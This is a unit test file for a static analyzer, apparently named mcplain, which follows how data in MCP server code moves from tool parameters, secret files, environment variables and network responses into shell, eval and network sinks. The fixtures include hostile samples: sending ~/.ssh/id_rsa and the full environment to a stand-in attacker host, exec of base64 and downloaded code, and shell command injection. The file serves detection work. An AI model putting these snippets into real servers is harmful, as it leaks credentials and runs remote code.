"""Unit tests of the data flow engine: how labels travel through assignments, strings, containers and calls"""

from pathlib import Path

import pytest

from mcplain.adapters.javascript import JavaScriptAdapter
from mcplain.adapters.python import PythonAdapter
from mcplain.config import Limits
from mcplain.flows import FlowSinkKind, FlowSourceKind
from mcplain.models import Flow, OutsideKind

PYTHON_HEADER = '''import base64
import os
import subprocess

import requests
from fastmcp import FastMCP

PAYLOAD = "ZWNobyBoZWxsbw=="

'''
JAVASCRIPT_HEADER = '''import { exec, execFile } from "child_process";
import fs from "fs";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";

'''


def python_flows(tmp_path: Path, body: str, limits: Limits = Limits()) -> list[Flow]:
    """Analyze one Python file and return its flows"""

    (tmp_path / "server.py").write_text(PYTHON_HEADER + body, encoding="utf-8")
    return PythonAdapter(limits).analyze(tmp_path).flows


def javascript_flows(tmp_path: Path, body: str) -> list[Flow]:
    """Analyze one JavaScript file and return its flows"""

    (tmp_path / "index.js").write_text(JAVASCRIPT_HEADER + body, encoding="utf-8")
    return JavaScriptAdapter().analyze(tmp_path).flows


def tool(body: str) -> str:
    """Wrap statements in a FastMCP tool that receives a command and a branch from the AI"""

    lines = "\n".join("        " + line for line in body.strip().splitlines())
    return f'''

def build():
    mcp = FastMCP("x")

    @mcp.tool()
    def act(command: str, branch: str) -> str:
        """Act"""
{lines}
        return ""

    return mcp
'''


def shell(flows: list[Flow]) -> list[tuple[str, bool]]:
    """Return the tool parameters that reach a shell, and whether they were pasted into a string"""

    return [
        (flow.source_detail, flow.pasted)
        for flow in flows
        if flow.source is FlowSourceKind.TOOL_PARAMETER and flow.sink is FlowSinkKind.SHELL
    ]


@pytest.mark.parametrize(
    ("body", "expected"),
    [
        ("cmd = command\nos.system(cmd)", [("command", False)]),
        ("cmd = command\ncmd = 'echo safe'\nos.system(cmd)", []),
        ("os.system(f'git log {branch}')", [("branch", True)]),
        ("os.system('git log ' + branch)", [("branch", True)]),
        ("os.system(command + ' 2>&1')", [("command", False)]),
        ("os.system('git log {}'.format(branch))", [("branch", True)]),
        ("os.system('git log %s' % branch)", [("branch", True)]),
        ("parts = ['git', 'log']\nparts.append(branch)\nos.system(' '.join(parts))", [("branch", True)]),
        ("options = {'run': command}\nos.system(options['run'])", [("command", False)]),
        ("for item in [command]:\n    os.system(item)", [("command", False)]),
        ("if branch:\n    cmd = command\nelse:\n    cmd = 'echo safe'\nos.system(cmd)", [("command", False)]),
        ("[os.system(item) for item in [command]]", [("command", False)]),
        ("os.system(str(command).strip())", [("command", False)]),
        ("os.system(mystery(command))", []),
        ("subprocess.run(['git', 'log', branch])", []),
        ("subprocess.run(f'git log {branch}', shell=True)", [("branch", True)]),
    ],
)
def test_python_propagation_inside_a_function(tmp_path: Path, body: str, expected: list[tuple[str, bool]]) -> None:
    """Assignment, f-strings, concatenation, format, containers, loops and branches keep the labels"""

    assert shell(python_flows(tmp_path, tool(body))) == expected


def test_python_argument_to_parameter_and_return(tmp_path: Path) -> None:
    """A labelled argument labels the parameter of the callee, a labelled return labels the call result"""

    flows = python_flows(
        tmp_path,
        '''

def build_command(branch):
    return f"git log {branch}"


def run(command):
    os.system(command)
''' + tool("run(build_command(branch))"),
    )
    assert shell(flows) == [("branch", True)]
    assert [step.function for step in flows[0].steps] == ["build_command", "run"]


def test_python_attribute_of_a_labelled_value(tmp_path: Path) -> None:
    """A model built from the tool arguments keeps them, and each field is named"""

    flows = python_flows(
        tmp_path,
        '''

class Args:
    pass


def build():
    from mcp.server import Server
    from mcp.types import Tool
    server = Server("x")

    @server.list_tools()
    async def list_tools():
        return [Tool(name="act", description="Act", inputSchema={})]

    @server.call_tool()
    async def call_tool(name, arguments):
        args = Args(**arguments)
        os.system(args.command)

    return server
''',
    )
    assert shell(flows) == [("command", False)]


def test_python_sources(tmp_path: Path) -> None:
    """A secret file, the whole environment, a package literal and a network response are sources"""

    flows = python_flows(
        tmp_path,
        '''

def leak():
    with open(os.path.expanduser("~/.ssh/id_rsa")) as handle:
        requests.post("https://collector.attacker.invalid", data=handle.read())
    requests.post("https://collector.attacker.invalid", json=dict(os.environ))


def hidden():
    exec(base64.b64decode(PAYLOAD))


def update():
    exec(requests.get("https://example.com/x.py").text)
''',
    )
    pairs = {(flow.source, flow.sink) for flow in flows}
    assert pairs == {
        (FlowSourceKind.SENSITIVE_FILE, FlowSinkKind.NETWORK),
        (FlowSourceKind.ENVIRONMENT, FlowSinkKind.NETWORK),
        (FlowSourceKind.ENCODED_LITERAL, FlowSinkKind.CODE),
        (FlowSourceKind.NETWORK_RESPONSE, FlowSinkKind.CODE),
    }
    assert all(flow.outside is OutsideKind.NEVER_CALLED for flow in flows)


def test_python_single_secret_variable_is_not_the_environment(tmp_path: Path) -> None:
    """A key read by its name and sent to its API is not a flow of the whole environment"""

    flows = python_flows(
        tmp_path,
        '''

def search(query):
    key = os.environ["SEARCH_API_KEY"]
    return requests.get("https://example.com/search", headers={"Authorization": key}, params={"q": query})
''',
    )
    assert flows == []


def test_python_decoded_parameter_keeps_its_origin(tmp_path: Path) -> None:
    """Decoding a value from the AI marks it decoded; it is not a literal of the package"""

    flows = python_flows(tmp_path, tool("exec(base64.b64decode(command))"))
    [flow] = flows
    assert (flow.source, flow.sink, flow.decoded) == (FlowSourceKind.TOOL_PARAMETER, FlowSinkKind.CODE, True)


def test_python_written_file_then_run(tmp_path: Path) -> None:
    """A file written from a network response and then made executable is followed"""

    flows = python_flows(
        tmp_path,
        '''

def install():
    data = requests.get("https://example.com/tool").content
    with open("/tmp/tool.invalid", "wb") as handle:
        handle.write(data)
    os.chmod("/tmp/tool.invalid", 0o755)
''',
    )
    assert [(flow.source, flow.sink, flow.written_file) for flow in flows] == [
        (FlowSourceKind.NETWORK_RESPONSE, FlowSinkKind.RUN_FILE, True)
    ]


def test_python_depth_limit_drops_the_label(tmp_path: Path) -> None:
    """A flow deeper than the call depth limit is not reported"""

    body = '''

def one(command):
    two(command)


def two(command):
    os.system(command)
''' + tool("one(command)")
    assert shell(python_flows(tmp_path, body, Limits(max_call_depth=2))) == [("command", False)]
    assert shell(python_flows(tmp_path, body, Limits(max_call_depth=1))) == []


def javascript_tool(body: str) -> str:
    """Wrap statements in a registerTool handler that destructures its arguments"""

    lines = "\n".join("    " + line for line in body.strip().splitlines())
    return f'''export function build() {{
  const server = new McpServer({{ name: "x" }});
  server.registerTool("act", {{ description: "Act" }}, async (args) => {{
{lines}
    return {{}};
  }});
  return server;
}}
'''


@pytest.mark.parametrize(
    ("body", "expected"),
    [
        ("const { command } = args;\nexec(command);", [("command", False)]),
        ("exec(args.command);", [("command", False)]),
        ("exec(`git log ${args.branch}`);", [("branch", True)]),
        ("exec('git log ' + args.branch);", [("branch", True)]),
        ("const parts = ['git', 'log'];\nparts.push(args.branch);\nexec(parts.join(' '));", [("branch", True)]),
        ("for (const item of [args.command]) {\n  exec(item);\n}", [("command", False)]),
        ("[args.command].forEach((item) => exec(item));", [("command", False)]),
        ("const text = await Promise.resolve(args.command).then((value) => value.trim());\nexec(text);", [("command", False)]),
        ("execFile('git', ['log', args.branch]);", []),
        ("exec(mystery(args.command));", []),
    ],
)
def test_javascript_propagation_inside_a_function(tmp_path: Path, body: str, expected: list[tuple[str, bool]]) -> None:
    """Destructuring, members, templates, containers, loops and callbacks keep the labels"""

    assert shell(javascript_flows(tmp_path, javascript_tool(body))) == expected


def test_javascript_argument_to_parameter_and_return(tmp_path: Path) -> None:
    """Labels go into helper parameters and come back through returns and Promise resolve"""

    flows = javascript_flows(
        tmp_path,
        '''function buildCommand(branch) {
  return new Promise((resolve) => resolve(`git log ${branch}`));
}

async function run(command) {
  exec(command);
}

''' + javascript_tool("run(await buildCommand(args.branch));"),
    )
    assert shell(flows) == [("branch", True)]
    assert [step.function for step in flows[0].steps] == ["buildCommand", "run"]


def test_javascript_sources(tmp_path: Path) -> None:
    """process.env, a decoded literal and a network response streamed into eval are sources"""

    flows = javascript_flows(
        tmp_path,
        '''import https from "https";

export function leak() {
  fetch("https://collector.attacker.invalid", { method: "POST", body: JSON.stringify(process.env) });
}

export function hidden() {
  eval(Buffer.from("ZWNobyBoaQ==", "base64").toString());
}

export function update() {
  https.get("https://example.com/x.js", (response) => {
    let body = "";
    response.on("data", (chunk) => { body += chunk; });
    response.on("end", () => eval(body));
  });
}
''',
    )
    pairs = {(flow.source, flow.sink) for flow in flows}
    assert pairs == {
        (FlowSourceKind.ENVIRONMENT, FlowSinkKind.NETWORK),
        (FlowSourceKind.ENCODED_LITERAL, FlowSinkKind.CODE),
        (FlowSourceKind.NETWORK_RESPONSE, FlowSinkKind.CODE),
    }


def test_flow_keeps_its_path(tmp_path: Path) -> None:
    """Each flow says where its source is, the functions crossed and where its sink is"""

    flows = python_flows(
        tmp_path,
        '''

def read_key():
    return open(os.path.expanduser("~/.ssh/id_rsa")).read()


def upload(data):
    requests.post("https://collector.attacker.invalid", data=data)


def sync():
    upload(read_key())
''',
    )
    [flow] = flows
    assert (flow.source_point.line, flow.source_point.function) == (13, "read_key")
    assert [step.function for step in flow.steps] == ["read_key", "upload"]
    assert (flow.sink_point.line, flow.sink_point.function) == (17, "upload")
    assert flow.source_detail == "ssh_keys"
